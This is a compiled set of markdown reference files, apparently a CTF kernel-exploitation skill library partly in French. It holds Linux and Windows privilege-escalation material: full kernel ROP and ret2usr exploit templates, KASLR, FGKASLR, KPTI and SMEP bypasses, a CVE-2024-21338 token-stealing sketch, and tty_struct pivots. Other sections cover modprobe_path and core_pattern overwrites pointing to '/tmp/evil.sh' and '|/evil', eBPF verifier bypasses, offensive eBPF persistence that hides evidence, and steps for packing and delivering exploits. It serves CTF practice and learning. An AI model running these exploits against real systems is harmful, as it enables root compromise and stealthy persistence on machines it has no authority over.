cat /proc/sys/vm/unprivileged_userfaultfd  # 0 = non dispo sans privilege

# Alternatives pour race stabilization sans uffd :

# 1. FUSE (Filesystem in USErspace) - toujours disponible
# Créer un FUSE filesystem → accès read() déclenche notre callback
# Le callback peut dormir arbitrairement → fenêtre de race configurable

# 2. MADV_DONTNEED + mprotect loop (DiceCTF 2026)
# Voir kernel-techniques.md pour détails

# 3. io_uring pour opérations lentes
# io_uring avec IOSQE_ASYNC force le passage en worker thread
# Donne une fenêtre de contrôle

# 4. setxattr sur /proc/self/attr/* pour allocation contrôlée
# Allocation temporaire dans le kernel pendant l'appel setxattr

# Checker si /dev/userfaultfd existe (alternative depuis Linux 5.7)
ls -la /dev/userfaultfd  # Si mode 0660 group kvm → accessible
```

---

## Ubuntu 24.04 Hardening — Nouveaux obstacles

```bash
# Nouvelles mitigations Ubuntu 24.04 / kernel 6.8+

# 1. CONFIG_RANDOM_KMALLOC_CACHES
# Chaque cache kmalloc-N est dupliqué en N variants aléatoires
# Rend le heap grooming beaucoup plus difficile (pas de placement prévisible)

# 2. CONFIG_SLAB_BUCKETS
# Buckets séparés par context (syscall, interrupt, softirq)
# Empêche le mélange d'allocations de différents contextes

# 3. CONFIG_INIT_ON_FREE_DEFAULT_ON
# Tous les objets freés sont remis à zéro → pas de data leaks via slab reuse

# Détection :
grep -E "RANDOM_KMALLOC|SLAB_BUCKET|INIT_ON_FREE" /boot/config-$(uname -r)

# Contournements :
# - Utiliser des elastic objects non randomisés (msg_msg, pipe_buffer)
# - Cross-cache via elastic objects (CROSS-X technique)
# - Out-of-slab writes via large kmalloc (kmalloc > PAGE_SIZE → buddy directement)
# - PTE manipulation via file-backed mmap overlaps
```

---

## Windows Kernel — PreviousMode Write (CVE-2024-21338)

**Source :** [github.com/hakaioffsec/CVE-2024-21338](https://github.com/hakaioffsec/CVE-2024-21338)  
**Concept :** Modifier `KTHREAD->PreviousMode` de UserMode (1) à KernelMode (0) → bypass de TOUS les checks d'adresse kernel.

```c
// KTHREAD structure (Windows 10/11)
// +0x232 PreviousMode : UChar  (0 = KernelMode, 1 = UserMode)

// Impact : avec PreviousMode = KernelMode :
// - ProbeForRead/ProbeForWrite ne vérifient plus l'adresse
// - MmCopyVirtualMemory accepte des adresses kernel
// - NtWriteVirtualMemory peut écrire n'importe où → AAW parfait

// Exploitation CVE-2024-21338 (appid.sys - AppLocker driver)
// Vulnérabilité : NULL pointer dereference via IOCTL dans appid.sys
// → permet d'écrire dans PreviousMode via l'IOCTL vulnérable

HANDLE hDevice = CreateFileA("\\\\.\\appid", 
    GENERIC_READ | GENERIC_WRITE, 0, NULL, 
    OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

// IOCTL pour modifier PreviousMode
// Payload : adresse de KTHREAD->PreviousMode + valeur 0 (KernelMode)
BYTE payload[16] = {0};
uint64_t kthread = get_current_kthread();  // Via NtQuerySystemInformation
uint64_t previousmode_addr = kthread + 0x232;

DeviceIoControl(hDevice, IOCTL_APPID_WRITE, 
                &previousmode_addr, sizeof(uint64_t),
                NULL, 0, &bytes, NULL);

// Maintenant PreviousMode = 0 (KernelMode)
// NtWriteVirtualMemory peut écrire dans n'importe quelle adresse kernel !

// Token stealing via NtWriteVirtualMemory (AAW parfait)
uint64_t system_token = get_system_token();  // Via NtQuerySystemInformation
uint64_t our_token_addr = get_our_token_addr();
NtWriteVirtualMemory(GetCurrentProcess(), 
                     (PVOID)our_token_addr, 
                     &system_token, sizeof(uint64_t), NULL);
```

### Trouver KTHREAD address depuis userland

```c
// Méthode 1 : NtQuerySystemInformation + cross-reference
SYSTEM_PROCESS_INFORMATION spi;
NtQuerySystemInformation(SystemProcessInformation, &spi, size, &needed);

// Méthode 2 : Lire GS:[0x188] via un trick NtQueryInformationThread
// Thread Information Block : GS:[0x188] = KTHREAD (accessible depuis kernel)

// Méthode 3 : NtQuerySystemInformation class 0x4D (SystemKernelDebuggerInformation)
// Leak kernel base → calculer KTHREAD depuis exports de ntoskrnl

// Méthode 4 : EnumDeviceDrivers + ReadProcessMemory
// Avec SeDebugPrivilege : lire EPROCESS list pour trouver le token
LPVOID imageBase;
EnumDeviceDrivers(&imageBase, sizeof(imageBase), &needed);
// imageBase[0] = ntoskrnl.exe base → calculer offsets depuis exports
```

---

## Windows Kernel — Segment Heap Exploitation

**Source :** [connormcgarr.github.io/swimming-in-the-kernel-pool-part-2](https://connormcgarr.github.io/swimming-in-the-kernel-pool-part-2/)  
**Contexte :** Depuis Windows 19H1 (2019), le kernel utilise le Segment Heap au lieu du Legacy Pool pour NonPagedPoolNx.

```c
// Différences Segment Heap vs Legacy Pool
// Legacy Pool : chunks consécutifs, header POOL_HEADER prévisible
// Segment Heap : similaire à userland nt heap, plus complexe

// Structure Segment Heap (kernel)
// VS_HEAP_SUBSEGMENT → VS_CHUNK_HEADER → User data
// BackendHeap → LFH (Low Fragmentation Heap) → segments

// Spray pour Segment Heap
// Les mêmes objets qu'avant fonctionnent, mais alignment différent
// Aligner les sprays sur des segments complets (0x1000 granularité)

#define SPRAY_OBJ_SIZE  0x100  // Pour kmalloc-256 equivalent
#define SEGMENT_SIZE    0x10000 // 64KB segments

// Étape 1 : Remplir un segment entier avec nos objets
for (int i = 0; i < SEGMENT_SIZE / SPRAY_OBJ_SIZE; i++) {
    allocate_kernel_obj(SPRAY_OBJ_SIZE);
}

// Étape 2 : Créer un "hole" dans le segment (pattern alternant)
for (int i = 0; i < count; i += 2) {
    free_kernel_obj(i);
}

// Étape 3 : Notre overflow dans l'objet restant cible le trou adjacent

// Objets intéressants à corrompre (Windows 10/11)
// - DISPATCHER_HEADER (synchronization primitive)
// - _FILE_OBJECT (file struct vtable)
// - _DEVICE_OBJECT (driver dispatch table)
// - WDM IRP structures
```

### Pool tag spray (pour corrompre un tag connu)

```c
// Pool tags permettent de cibler des types d'objets spécifiques
// Tag 'NpFr' = Named Pipe fragments (toujours alloués dans NonPaged)

// Spray de Named Pipe pour cibler une allocation spécifique
for (int i = 0; i < 1000; i++) {
    HANDLE pipe_r, pipe_w;
    CreatePipe(&pipe_r, &pipe_w, NULL, 0x100);  // Force allocation NpFr
    // Conserver les handles pour maintenir l'allocation
    spray_handles[i * 2] = pipe_r;
    spray_handles[i * 2 + 1] = pipe_w;
}
```

---

## Zero-Copy Page Aliasing via vmsplice-Gift → TOCTOU (source: hxp 39C3 folly)

**Trigger:** userspace proxy (Go/C++) that copies HTTP headers from a shared buffer after a check, while a second thread can mutate that buffer; kernel allows `vmsplice(SPLICE_F_GIFT)` + `getsockopt(TCP_ZEROCOPY_RECEIVE)`.
**Signals:** `SPLICE_F_GIFT`/`SPLICE_F_MOVE` in strace, `MSG_ZEROCOPY` in sendmsg calls, `PACKET_MMAP` ring, Go runtime with cgo.
**Mechanic:** gift a user page through pipe→socket via `vm_insert_page`, which bypasses `can_map_frag`'s reverse-mapping check; kernel maps the same physical page read-write into both the proxy's and the attacker's VMA. Between the proxy's header validation and forwarding step, flip bytes cross-process with no syscall. Effective as a "kernel-assisted TOCTOU" where conventional thread races are too slow.
**Hardening hint:** hunt for missing `unmap_and_move` on gifted pages in any zero-copy path.
Source: [hxp.io/blog/123/hxp-39C3-CTF-folly](https://hxp.io/blog/123/hxp-39C3-CTF-folly/).

## eBPF Verifier Bypass — Pointer Arithmetic Mis-Tracking (source: CVE-2024-1086 / CVE-2022-23222 family)

**Trigger:** kernel has `net.core.bpf_jit_enable=1` and unpriv BPF may be available; challenge exposes a `bpf(2)` syscall wrapper or a sandbox runs untrusted BPF bytecode.
**Signals:** `/proc/sys/kernel/unprivileged_bpf_disabled = 0`; `bpf_prog_load` reachable; kernel 5.13-6.5 range (pre CVE-2024-1086 patches).
**Mechanic:** craft a program that tricks the verifier into believing a pointer has type `SCALAR_VALUE` when it's actually `PTR_TO_MAP_VALUE` (or vice-versa). The classic pattern:
```
r1 = (map pointer)
r2 = r1 + 0                    # verifier tracks r2 = PTR_TO_MAP_VALUE
if (some_cond) r2 = 0          # dead branch, but verifier widens type
r3 = *(u64*)(r2 + 8)          # verifier now thinks r2 is scalar, allows it
```
The runtime type is still a pointer → arbitrary kernel R/W once primitives chained. Escalate via `modprobe_path` overwrite or `core_pattern` pipe.

**Counter-grep:** look for `BPF_ALU64_IMM` and `BPF_MOV64_REG` sequences where the verifier state would lose precision. Tools: `bpftool prog dump xlated` shows the verifier-believed types.

## eBPF `BPF_MAP_TYPE_RINGBUF` Kernel-Leak Primitive

**Trigger:** sandbox allows ringbuf output but not arbitrary pointers; kernel ≥ 5.8.
**Signals:** `BPF_MAP_TYPE_RINGBUF` in program maps; `bpf_ringbuf_output()` call reachable.
**Mechanic:** when outputting user-controlled data to a ringbuf, recent kernels didn't scrub stale padding bytes. A carefully sized record inherits bytes from kernel stack or adjacent ringbuf slots → slow but reliable KASLR leak. Pair with a verifier bypass for full R/W.

## eBPF as Offensive Telemetry (bypass detection)

**Trigger:** red-team scenario; attacker is root on target; needs fileless persistence.
**Signals:** CO-RE (`libbpf`) installed; `bpftool` available; `/sys/kernel/btf/vmlinux` present.
**Mechanic:** load a kprobe on `sys_execve` / `tcp_sendmsg` that modifies arguments in-kernel (with `bpf_probe_write_user` on old kernels, or using uprobe `BPF_PROG_TYPE_KPROBE` with RET). No userspace process persists; `bpftool prog list` is the only trace. Use `BPF_PROG_TYPE_LSM` on ≥ 5.7 to *prevent* other processes from seeing the evidence.

## eBPF FSM Syscall-Sequence Gate (source: pwn.college AoP 2025 — existing section cross-ref)

See `sandbox-escape.md#ebpf-fsm-syscall-sequence-gate`. When BPF is USED as a sandbox (not a target), the FSM transitions are the attack surface — race the state transition with a sibling thread.

## eBPF Tooling

- **libbpf-bootstrap**: minimal skeletons for CO-RE programs; includes `bootstrap.c` template.
- **bpftool prog dump xlated**: verifier's view of the IR (what the verifier thinks each register is).
- **bpftool prog dump jited**: actual JITed native code; useful to confirm a verifier bypass produced the expected machine code.
- **ebpf-verifier** (Linux source `tools/testing/selftests/bpf/`): run the verifier standalone.
- **GDB kernel** + `bpftool` live: set `break __bpf_prog_run` and inspect `BPF_PROG_CTX_INFO`.

## Pattern Recognition Index additions (add to ctf-pwn/SKILL.md)

| Signal | Technique → file |
|---|---|
| `unprivileged_bpf_disabled=0` + kernel 5.13-6.5 + `bpf_prog_load` reachable | eBPF verifier pointer-arith bypass → kernel-advanced.md |
| `BPF_MAP_TYPE_RINGBUF` + kernel < 5.15 | Ringbuf stale-byte KASLR leak → kernel-advanced.md |
| Root+`libbpf-bootstrap` demanded; fileless persistence challenge | Offensive eBPF kprobe hooks → kernel-advanced.md |



---

<!-- Source: kernel-bypass.md -->

# CTF Pwn - Kernel Protection Bypass

## Table of Contents
- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
  - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
  - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
- [KPTI Bypass Methods](#kpti-bypass-methods)
  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
- [SMEP / SMAP Bypass](#smep--smap-bypass)
- [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
- [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
- [Initramfs and virtio-9p Workflow](#initramfs-and-virtio-9p-workflow)
- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
- [Exploit Templates](#exploit-templates)
  - [Full Kernel ROP Template (SMEP + KPTI)](#full-kernel-rop-template-smep--kpti)
  - [ret2usr Template (No SMEP/SMAP)](#ret2usr-template-no-smepsmap)
- [Exploit Delivery](#exploit-delivery)

---

## KASLR and FGKASLR Bypass

### KASLR Bypass via Stack Leak (hxp CTF 2020)

Leak a kernel text pointer from the stack to compute the KASLR (Kernel Address Space Layout Randomization) slide:

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**Other KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- Kernel oops messages (if oops doesn't panic)
- UAF reading freed kernel objects containing text pointers
- `modprobe_path` has 1-byte entropy — brute-forceable with AAW

### FGKASLR Bypass (hxp CTF 2020)

FGKASLR (Function Granular KASLR) randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.

**Method 1: Use only unaffected `.text` gadgets**

```bash
# Find gadgets only in the non-randomized range
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.

**Method 2: Resolve randomized functions via `__ksymtab`**

`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

unsigned long ksymtab_prepare_kernel_cred = 0xffffffff81f8d4fc; // from /proc/kallsyms
unsigned long ksymtab_commit_creds = 0xffffffff81f87d90;

// ROP chain to read ksymtab entry and compute real address:
// 1. Load ksymtab address into rax
payload[off++] = pop_rax_ret + kaslr_offset;
payload[off++] = ksymtab_prepare_kernel_cred + kaslr_offset;
// 2. Read 4-byte relative offset: mov eax, [rax]
payload[off++] = mov_eax_deref_rax_pop1_ret + kaslr_offset;
payload[off++] = 0x0;
// 3. Return to userland to compute: real_addr = ksymtab_addr + kaslr_offset + offset
payload[off++] = kpti_trampoline + kaslr_offset + 22;
payload[off++] = 0; payload[off++] = 0;
payload[off++] = (unsigned long)resolve_and_continue;
// ...

void resolve_and_continue() {
    // eax contains the relative offset read from ksymtab
    unsigned long resolved = ksymtab_prepare_kernel_cred + kaslr_offset + fetched_offset;
    // Now use resolved address in next ROP stage
}
```

**Key insight:** FG-KASLR requires a multi-stage exploit: first return to userland to compute resolved addresses from `__ksymtab` offsets, then re-enter the kernel with a second ROP chain using the resolved function addresses.

---

## KPTI Bypass Methods

KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:

### Method 1: swapgs_restore Trampoline

The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.

### Method 2: Signal Handler (SIGSEGV)

Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.

### Method 3: modprobe_path via ROP

Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.

See [kernel.md - modprobe_path Overwrite](kernel.md#modprobe_path-overwrite) for the full technique, trigger sequence, and ROP payload.

### Method 4: core_pattern via ROP

Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.

See [kernel.md - core_pattern Overwrite](kernel.md#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.

---

## SMEP / SMAP Bypass

**SMEP (Supervisor Mode Execution Prevention):** Blocks executing userland pages from kernel mode.
- **Bypass:** Use kernel ROP (kROP) chains — all gadgets from kernel `.text`. See [kernel.md - Kernel ROP](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds).

**SMAP (Supervisor Mode Access Prevention):** Blocks accessing userland memory from kernel mode.
- **Bypass:** kROP with heap-resident chain (all data in kernel heap), or `stac`/`clac` gadgets to temporarily disable SMAP.

**Direct CR4 modification (old kernels):** Write to CR4 to clear SMEP/SMAP bits. Blocked on modern kernels by `native_write_cr4()` pinning.

---

## KPTI / SMEP / SMAP Quick Reference

| Protection | Blocks | Bypass |
|-----------|--------|--------|
| SMEP | Executing userland pages from kernel | kROP (kernel ROP chain) — see [kernel.md](kernel.md#kernel-rop-with-prepare_kernel_cred--commit_creds) |
| SMAP | Accessing userland memory from kernel | kROP with heap-resident chain, `stac`/`clac` gadgets |
| No SMEP/SMAP | (nothing) | [ret2usr](kernel.md#ret2usr-no-smepsmap) — directly call userland privesc function |
| KPTI | Kernel page table isolation | [Trampoline](#method-1-swapgs_restore-trampoline), [signal handler](#method-2-signal-handler-sigsegv), [modprobe_path](#method-3-modprobe_path-via-rop), [core_pattern](#method-4-core_pattern-via-rop) |

See [KPTI Bypass Methods](#kpti-bypass-methods) for detailed bypass techniques with code.

---

## GDB Kernel Module Debugging

Load vulnerable kernel module symbols in GDB for source-level debugging:

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.

---

## Initramfs and virtio-9p Workflow

**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o ./share/exploit
```

**Extract and modify initramfs:**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**Key modifications to `/init` for debugging:**
- Comment out `exec su -l ctf` (or similar) to keep root privileges
- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses

---

## Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL

`/proc/kallsyms` only shows `.text` symbols by default. Data symbols like `modprobe_path` and `core_pattern` require `CONFIG_KALLSYMS_ALL=y`.

**Finding modprobe_path:**

```bash
# 1. Get call_usermodehelper_setup address (always in /proc/kallsyms)
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. In GDB, set breakpoint and trigger
hb *0xffffffff810c8c80
# Trigger: echo -ne '\xff\xff\xff\xff' > /tmp/x && chmod +x /tmp/x && /tmp/x

# 3. Check first argument (RDI = modprobe_path)
(gdb) p/x $rdi
# 0xffffffff8265ff00
(gdb) x/s $rdi
# "/sbin/modprobe"
```

**Finding core_pattern:**

```bash
# 1. Set breakpoint on override_creds (called by do_coredump)
# 2. Crash a process: gcc -static -o crash -xc - <<< 'int main(){((void(*)())0)();}'
# 3. After override_creds returns, disassemble — look for data address in movzx
```

---

## Exploit Templates

### Full Kernel ROP Template (SMEP + KPTI)

Complete exploit for kernel stack overflow with SMEP and KPTI enabled:

```c
#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>

// Addresses from vmlinux (apply KASLR offset if needed)
unsigned long prepare_kernel_cred;
unsigned long commit_creds;
unsigned long pop_rdi_ret;
unsigned long mov_rdi_rax_pop1_ret;
unsigned long kpti_trampoline;

// Userland state
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}

int main() {
    save_userland_state();
    int fd = open("/dev/hackme", O_RDWR);

    // Step 1: Leak canary + KASLR base
    unsigned long leak[40];
    read(fd, leak, sizeof(leak));
    unsigned long cookie = leak[16];
    unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - 0xffffffff81000000;

    // Step 2: Apply KASLR offset
    prepare_kernel_cred += kaslr_offset;
    commit_creds += kaslr_offset;
    pop_rdi_ret += kaslr_offset;
    mov_rdi_rax_pop1_ret += kaslr_offset;
    kpti_trampoline += kaslr_offset;

    // Step 3: Build ROP chain
    unsigned long payload[50];
    int off = 16;
    payload[off++] = cookie;
    payload[off++] = 0;  // rbx
    payload[off++] = 0;  // r12
    payload[off++] = 0;  // rbp

    // prepare_kernel_cred(0) → commit_creds(result)
    payload[off++] = pop_rdi_ret;
    payload[off++] = 0;
    payload[off++] = prepare_kernel_cred;
    payload[off++] = mov_rdi_rax_pop1_ret;
    payload[off++] = 0;  // pop rbx padding
    payload[off++] = commit_creds;

    // KPTI-safe return to userland
    payload[off++] = kpti_trampoline + 22;
    payload[off++] = 0;  // padding
    payload[off++] = 0;  // padding
    payload[off++] = user_rip;
    payload[off++] = user_cs;
    payload[off++] = user_rflags;
    payload[off++] = user_sp;
    payload[off++] = user_ss;

    write(fd, payload, sizeof(payload));
    return 0;
}
```

### ret2usr Template (No SMEP/SMAP)

```c
void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"
        "call rax;"
        "mov rdi, rax;"
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

---

## Exploit Delivery

Kernel exploits are typically large static binaries. Minimize size for remote delivery:

```bash
# 1. Compile with musl-libc (much smaller than glibc)
musl-gcc -static -O2 -o exploit exploit.c

# 2. Strip symbols
strip exploit

# 3. Compress and encode for transfer
gzip exploit && base64 exploit.gz > exploit.b64

# 4. On target: decode and decompress
base64 -d exploit.b64 | gunzip > /tmp/exploit && chmod +x /tmp/exploit

# Optional: UPX compression (further reduces size)
upx --best exploit
```

**Common pitfall:** If the exploit uses `setxattr()` with a file path, ensure the file exists in the remote environment. Local path (`/tmp/exploit`) may differ from remote path (`/home/user/exploit`).



---

<!-- Source: kernel-techniques.md -->

# CTF Pwn - Kernel Exploitation Techniques

## Table of Contents
- [tty_struct RIP Hijack and kROP](#tty_struct-rip-hijack-and-krop)
  - [kROP via Fake Vtable on tty_struct](#krop-via-fake-vtable-on-tty_struct)
  - [AAW via ioctl Register Control](#aaw-via-ioctl-register-control)
- [userfaultfd Race Stabilization](#userfaultfd-race-stabilization)
  - [Alternative Race Techniques (uffd Disabled)](#alternative-race-techniques-uffd-disabled)
- [SLUB Allocator Internals](#slub-allocator-internals)
  - [Freelist Pointer Hardening](#freelist-pointer-hardening)
  - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
- [Leak via Kernel Panic](#leak-via-kernel-panic)
- [Race Window Extension via MADV_DONTNEED + mprotect (DiceCTF 2026)](#race-window-extension-via-madv_dontneed--mprotect-dicectf-2026)
- [Cross-Cache Attack via CPU-Split Strategy (DiceCTF 2026)](#cross-cache-attack-via-cpu-split-strategy-dicectf-2026)
- [PTE Overlap Primitive for File Write (DiceCTF 2026)](#pte-overlap-primitive-for-file-write-dicectf-2026)

For kernel fundamentals (environment setup, heap spray structures, stack overflow, privilege escalation, modprobe_path, core_pattern), see [kernel.md](kernel.md).

For protection bypass techniques (KASLR, FGKASLR, KPTI, SMEP, SMAP), GDB debugging, initramfs workflow, and exploit templates, see [kernel-bypass.md](kernel-bypass.md).

---

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:

```text
tty_struct layout for kROP:
  +0x00: magic, kref   -> 0x5401 (preserve paranoia check)
  +0x08: dev            -> addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         -> &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            -> &tty_struct + 0x50 (pointer to fake vtable)
  ...
  +0x50:                -> fake vtable (0x120 bytes), ioctl entry points to `leave` gadget
  ...
  +0x170:               -> actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**Execution flow:**
1. `ioctl(ptmx_fd, cmd, arg)` -> `tty_ioctl()` -> paranoia check passes (magic=0x5401)
2. `tty->ops->ioctl()` -> jumps to `leave` gadget at fake vtable
3. `leave` = `mov rsp, rbp; pop rbp` -- RBP points to `tty_struct` itself
4. RSP now points to `tty_struct + 0x08` (the `dev` field)
5. `ret` to `pop rsp` gadget at `dev`, pops `driver` as new RSP
6. RSP now at `tty_struct + 0x170` -> actual ROP chain runs

**Key insight:** RBP points to `tty_struct` at the time of the vtable call. The `leave` instruction pivots the stack into the structure itself, enabling a two-phase bootstrap: first `leave` to enter the structure, then `pop rsp` to jump to the ROP chain area.

**Alternative:** The gadget `push rdx; ... pop rsp; ... ret` at a fixed offset in many kernels enables direct stack pivot via `ioctl`'s 3rd argument (RDX is fully controlled):

```c
// ioctl(fd, cmd, arg) -> RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg -> ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

### AAW via ioctl Register Control

When full kROP is not needed, use `tty_struct` for Arbitrary Address Write (AAW) to overwrite `modprobe_path`:

Register control from `ioctl(fd, cmd, arg)`:
- `cmd` (32-bit) -> partial control of RBX, RCX, RSI
- `arg` (64-bit) -> full control of RDX, R8, R12

Write gadget in fake vtable: `mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` (uffd) makes kernel race conditions deterministic by pausing execution at page faults.

**How it works:**
1. `mmap()` a region with `MAP_PRIVATE` (no physical pages allocated)
2. Register the region with `userfaultfd` via `ioctl(UFFDIO_REGISTER)`
3. When the kernel accesses this region (e.g., during `copy_from_user()`), a page fault occurs
4. The faulting kernel thread blocks until userspace handles the fault
5. During the block, the exploit modifies shared state (freeing objects, spraying heap, etc.)
6. Userspace resolves the fault via `ioctl(UFFDIO_COPY)`, kernel thread resumes

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
